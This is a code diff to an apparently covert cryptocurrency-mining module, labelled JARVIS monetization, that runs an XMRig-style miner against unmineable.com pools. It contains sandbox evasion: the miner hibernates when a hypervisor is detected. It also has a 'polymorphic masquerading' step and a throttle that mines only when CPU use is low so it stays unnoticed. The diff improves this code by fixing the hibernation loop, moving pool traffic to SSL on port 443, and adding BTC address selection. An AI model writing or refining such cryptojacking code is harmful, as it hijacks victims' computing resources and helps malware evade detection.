@@ -17,8 +17,9 @@ sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
 try:
     from backend.core.mining_registry import ALGO_REGISTRY
 except ImportError:
+    # MANDATE: Use parameters from @xmrig.bat
     ALGO_REGISTRY = {
-        "RX": {"algo": "rx/0", "stratum": "rx.unmineable.com:3333"},
+        "RX": {"algo": "rx", "stratum": "stratum+ssl://rx.unmineable.com:443"},
         "KAWPOW": {"algo": "kawpow", "stratum": "kp.unmineable.com:3333"}
     }
 
@@ -199,8 +200,13 @@ class MinerManager:
         if self.process and self.process.poll() is None:
             return
 
-        worker_name = self._get_worker_id()
-        user = f"{coin}:{address}.{worker_name}#{ref}"
+        # If the address is a username (like ToxicSavage304), use it directly as mandated by @xmrig.bat
+        if len(address) < 20: 
+            user = address
+        else:
+            worker_name = self._get_worker_id()
+            user = f"{coin}:{address}.{worker_name}#{ref}"
+            
         params = ALGO_REGISTRY.get(protocol, ALGO_REGISTRY["RX"])
         
         # Alien Shard: Polymorphic Masquerading
@@ -250,7 +256,7 @@ class MonetizationService:
         self.xmr_address = xmr_address
         self.btc_address = btc_address
         self.is_running = True
-        self.current_target = "XMR"
+        self.current_target = "BTC"
         self.failover_count = 0
 
     def get_secure_telemetry(self):
@@ -274,7 +280,7 @@ class MonetizationService:
             if AlienShardProtocol.detect_hypervisor():
                 print("[JARVIS-MONETIZATION]: Hypervisor detected. Hibernating 30m.")
                 self.cpu_manager.stop_mining()
-                0
+                time.sleep(1800) # Fix: Was '0' which caused a tight loop
                 continue
 
             cpu_usage = psutil.cpu_percent(interval=10)
@@ -284,9 +290,12 @@ class MonetizationService:
             
             if cpu_usage < organic_threshold:
                 try:
-                    self.cpu_manager.start_mining(self.current_target, self.xmr_address)
+                    # Select address based on target coin
+                    target_address = self.btc_address if self.current_target == "BTC" else self.xmr_address
+                    self.cpu_manager.start_mining(self.current_target, target_address)
                     self.failover_count = 0
-                except:
+                except Exception as e:
+                    print(f"[JARVIS-MONETIZATION]: Error starting miner: {e}")
                     self.failover_count += 1
                     if self.failover_count > 3:
                         print("[JARVIS-MONETIZATION]: Failover triggered. Rotating algorithms.")
